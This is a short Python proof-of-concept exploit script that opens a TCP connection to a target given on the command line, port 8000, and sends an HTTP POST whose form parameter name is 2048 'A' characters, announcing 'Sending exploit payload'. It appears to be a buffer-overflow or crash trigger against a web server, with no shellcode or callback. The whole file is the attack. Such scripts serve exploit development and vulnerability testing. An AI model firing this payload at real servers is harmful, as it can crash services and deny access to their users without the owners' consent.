#!/usr/bin/python

import socket
import sys
import struct

TCP_IP = sys.argv[1]
TCP_PORT = 8000

xx = "A"*2048


http_req = "POST /index.html HTTP/1.1\r\n"
http_req += "Host: 192.168.94.1\r\n"
http_req += "From: header-data\r\n"
http_req += "Content-Type: application/x-www-form-urlencoded\r\n\r\n"
http_req += xx + "=param_data1&param_name2=param_data2"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))
print("[+] Sending exploit payload...")
s.send(http_req.encode())
s.close()